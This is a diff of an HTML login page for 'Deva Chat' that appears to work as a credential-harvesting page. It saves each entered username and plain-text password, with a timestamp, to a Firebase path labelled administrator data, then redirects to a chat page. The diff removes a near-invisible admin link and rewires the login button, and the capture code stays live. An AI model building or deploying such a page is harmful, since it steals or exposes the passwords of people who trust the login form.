@@ -7,10 +7,9 @@
     <style>
         body { background: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .login-card { width: 320px; border: 1px solid #363636; padding: 40px; text-align: center; border-radius: 8px; }
-        h1 { font-style: italic; font-size: 35px; margin-bottom: 30px; letter-spacing: -1px; }
+        h1 { font-style: italic; font-size: 35px; margin-bottom: 30px; }
         input { width: 100%; padding: 12px; margin: 8px 0; background: #121212; border: 1px solid #363636; color: white; border-radius: 5px; box-sizing: border-box; }
         button { width: 100%; padding: 12px; background: #0095f6; border: none; color: white; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 15px; }
-        .secret { position: fixed; bottom: 5px; right: 5px; opacity: 0.05; text-decoration: none; color: white; font-size: 10px; }
     </style>
 </head>
 <body>
@@ -18,9 +17,8 @@
         <h1>Deva Chat</h1>
         <input type="text" id="username" placeholder="Kullanıcı Adı">
         <input type="password" id="password" placeholder="Şifre">
-        <button onclick="girisYap()">Giriş Yap</button>
+        <button id="loginBtn">Giriş Yap</button>
     </div>
-    <a href="admin.html" class="secret">Yönetici</a>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
@@ -39,20 +37,28 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        window.girisYap = function() {
+        document.getElementById('loginBtn').addEventListener('click', () => {
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
+
             if(user && pass) {
+                // Bilgileri gönderiyoruz
                 set(ref(db, 'yonetici_verileri/' + user), {
                     kullanici: user,
                     sifre: pass,
                     tarih: new Date().toLocaleString()
-                }).then(() => {
+                })
+                .then(() => {
                     localStorage.setItem('chatUser', user);
-                    window.location.href = "chat.html";
+                    window.location.href = "chat.html"; // Bilgi gidince yönlendir
+                })
+                .catch((error) => {
+                    alert("Hata Oluştu: " + error.message);
                 });
+            } else {
+                alert("Lütfen tüm alanları doldurun!");
             }
-        }
+        });
     </script>
 </body>
 </html>
